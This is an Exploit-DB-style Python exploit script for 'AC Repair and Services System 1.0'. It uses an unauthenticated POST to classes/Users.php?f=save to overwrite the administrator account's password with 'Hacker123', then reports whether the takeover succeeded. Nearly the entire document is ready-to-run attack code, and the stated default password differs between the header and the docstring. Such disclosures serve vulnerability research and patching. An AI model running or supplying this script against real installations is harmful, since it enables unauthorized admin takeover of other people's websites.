# Exploit Title: AC Repair and Services System 1.0 - Unauthenticated Admin Account Takeover
# Date: September 28, 2023
# Exploit Author: Puja Dey
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/download-code?nid=16513&title=AC+Repair+and+Services+System+using+PHP+and+MySQL+Source+Code+Free+Download
# Version: 1.0
# Tested on: Windows 10 Home 64 Bit + Wampserver Version 3.2.3 & Ubuntu & Kali

#!/usr/bin/python

# Description:

# 1. This uses python to directly send a request on the server page classes/Users.php?f=save
# 2. The function in the applicaiton is not checking for the source cookie and any request without cookie can be sent to change the password for admin user.
# 3. The script by default sets the password as "hacker@123"

import requests
from PIL import Image
from io import BytesIO
from colorama import Fore, Back, Style
'''
Description:
1. This uses python to directly send a request on the server page classes/Users.php?f=save
2. The function in the applicaiton is not checking for the source cookie and any request without cookie can be sent to change the password for admin user.
3. The script by default sets the password as "Hacker123"
------------------------------------------
Developed by - Puja Dey
------------------------------------------
'''

image = Image.new('RGB', (1, 1), color='white')
buffer = BytesIO()
image.save(buffer,format='PNG')

# Variables : change the URL according to need
URL="http://localhost/php-acrss/"
password = "Hacker123"
updateuserdetails = {"id":"1","firstname":"Administrator","middlename":"","lastname":"Admin","username":"admin","password":password}
files={"image":("1.png",buffer.getvalue(),"image/png")}

def format_text(title,item):
  cr = '\r\n'
  section_break=cr + '*'*(len(str(item))+len(title)+ 3) + cr 
  item=str(item)
  text= Fore.YELLOW +section_break + Style.BRIGHT+ Fore.RED + title + Fore.RESET +" : "+  Fore.BLUE + item + Fore.YELLOW + section_break + Fore.RESET
  return text

response = requests.post(URL + "/classes/Users.php?f=save",data=updateuserdetails,files=files)

#print statements
print(format_text("Target",URL),end='')
print(format_text("Password Change","success" if response.status_code ==200 else "fail"),end='')
print(format_text("Use the below password",password))